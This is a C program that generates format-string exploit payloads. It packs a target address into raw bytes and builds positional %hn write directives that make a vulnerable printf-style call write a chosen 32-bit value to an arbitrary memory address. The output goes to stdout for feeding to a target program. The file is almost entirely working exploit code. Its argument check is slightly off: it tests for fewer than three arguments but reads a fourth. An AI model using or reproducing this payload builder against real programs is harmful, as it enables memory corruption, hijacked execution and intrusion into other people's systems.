
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/**
   The 4 bytes where we have to write are placed that way : HH HH LL LL

   The variables ending with "*h" refer to the high part of the word (H)
   The variables ending with "*l" refer to the low part of the word (L)
 */
char* build(unsigned int addr, unsigned int value, unsigned int where) {

  unsigned int length = 128; //too lazy to evaluate the true length ...
  unsigned int valh;
  unsigned int vall;
  unsigned char b0 = (addr >> 24) & 0xff;
  unsigned char b1 = (addr >> 16) & 0xff;
  unsigned char b2 = (addr >>  8) & 0xff;
  unsigned char b3 = (addr      ) & 0xff;

  char *buf;

  /* detailing the value */
  valh = (value >> 16) & 0xffff; //top
  vall = value & 0xffff;         //bottom

  fprintf(stderr, "adr : %d (%x)\n", addr, addr);
  fprintf(stderr, "val : %d (%x)\n", value, value);
  fprintf(stderr, "valh: %d (%.4x)\n", valh, valh);
  fprintf(stderr, "vall: %d (%.4x)\n", vall, vall);

  /* buffer allocation */
  if ( ! (buf = (char *)malloc(length*sizeof(char))) ) {
    fprintf(stderr, "Can't allocate buffer (%d)\n", length);
    exit(EXIT_FAILURE);
  }
  memset(buf, 0, length);

  /* let's build */
  if (valh < vall) {

    snprintf(buf,
             length,
             "%c%c%c%c"           /* high address */
             "%c%c%c%c"           /* low address */

             "%%.%hdx"            /* set the value for the first %hn */
             "%%%d$hn"            /* the %hn for the high part */

             "%%.%hdx"            /* set the value for the second %hn */
             "%%%d$hn"            /* the %hn for the low part */         
             ,
             b3+2, b2, b1, b0,    /* high address */
             b3, b2, b1, b0,      /* low address */

             valh-8,              /* set the value for the first %hn */  
             where,               /* the %hn for the high part */        
                                                                         
             vall-valh,           /* set the value for the second %hn */ 
             where+1              /* the %hn for the low part */               
             );
             
  } else {

     snprintf(buf,
             length,
             "%c%c%c%c"           /* high address */
             "%c%c%c%c"           /* low address */

             "%%.%hdx"            /* set the value for the first %hn */    
             "%%%d$hn"            /* the %hn for the high part */          
                                                                           
             "%%.%hdx"            /* set the value for the second %hn */   
             "%%%d$hn"            /* the %hn for the low part */           
             ,                                                             
             b3+2, b2, b1, b0,    /* high address */                       
             b3, b2, b1, b0,      /* low address */                        
                                                                           
             vall-8,              /* set the value for the first %hn */    
             where+1,             /* the %hn for the high part */          
                                                                           
             valh-vall,           /* set the value for the second %hn */   
             where                /* the %hn for the low part */
             );
  }
  return buf;
}

int
main(int argc, char **argv) {

  char *buf;

  if (argc < 3)
    return EXIT_FAILURE;
  buf = build(strtoul(argv[1], NULL, 16),  /* adresse */
              strtoul(argv[2], NULL, 16),  /* valeur */
              atoi(argv[3]));              /* offset */
  
  fprintf(stderr, "[%s] (%d)\n", buf, strlen(buf));
  printf("%s",  buf);
  return EXIT_SUCCESS;
}

